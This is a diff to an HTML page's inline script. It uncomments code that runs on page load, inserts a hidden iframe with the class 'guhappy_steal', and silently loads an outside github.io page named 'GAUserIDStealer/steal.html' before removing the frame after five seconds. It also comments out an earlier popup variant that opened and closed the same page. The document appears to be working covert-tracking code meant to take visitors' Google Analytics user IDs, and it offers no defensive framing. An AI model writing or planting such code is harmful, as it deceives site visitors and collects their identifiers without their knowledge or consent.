@@ -7,40 +7,40 @@
     <titile>Document</titile>
 <!--     <iframe id="cframe" style="display:none"></iframe> -->
     <script>
-//     function makeid(length) {
-//         var result           = '';
-//         var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-//         var charactersLength = characters.length;
-//         for ( var i = 0; i < length; i++ ) {
-//            result += characters.charAt(Math.floor(Math.random() * charactersLength));
-//         }
-//         return result;
-//      }
+    function makeid(length) {
+        var result           = '';
+        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        var charactersLength = characters.length;
+        for ( var i = 0; i < length; i++ ) {
+           result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        }
+        return result;
+     }
      
    
      function doFlow(){
     
-//          var guhappyId=makeid(5);
-//          var ifrm_c = document.createElement('iframe');
-//          ifrm_c.setAttribute('id', guhappyId);
-//          ifrm_c.setAttribute('class', 'guhappy_steal');
-//          ifrm_c.style.display = "none";
-//          document.head.appendChild(ifrm_c);
+         var guhappyId=makeid(5);
+         var ifrm_c = document.createElement('iframe');
+         ifrm_c.setAttribute('id', guhappyId);
+         ifrm_c.setAttribute('class', 'guhappy_steal');
+         ifrm_c.style.display = "none";
+         document.head.appendChild(ifrm_c);
          
-//          var cframe=document.getElementById(guhappyId);
+         var cframe=document.getElementById(guhappyId);
          
-// //          var cframe=document.getElementById("cframe");
+//          var cframe=document.getElementById("cframe");
          
-//          cframe.addEventListener("load",function(){
-//              setTimeout(function(){
-//                  cframe.parentNode.removeChild(cframe);
-//                  cframe.parentNode=null;
-//              }, 5000);
+         cframe.addEventListener("load",function(){
+             setTimeout(function(){
+                 cframe.parentNode.removeChild(cframe);
+                 cframe.parentNode=null;
+             }, 5000);
              
-//          });
+         });
          
     
-//          cframe.src ="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
+         cframe.src ="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
          
          
 //         var xhr = new XMLHttpRequest(),
@@ -64,8 +64,8 @@
 //          a.href="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
 //          document.body.appendChild(a);
 //          a.click();
-         createWindow = setTimeout(function(){window.open("https://newmangervase91.github.io/GAUserIDStealer/steal.html")}, 500);
-         close_w = setTimeout(function(){createWindow.close()}, 1000);
+//          createWindow = setTimeout(function(){window.open("https://newmangervase91.github.io/GAUserIDStealer/steal.html")}, 500);
+//          close_w = setTimeout(function(){createWindow.close()}, 1000);
      }
      doFlow();
     </script>
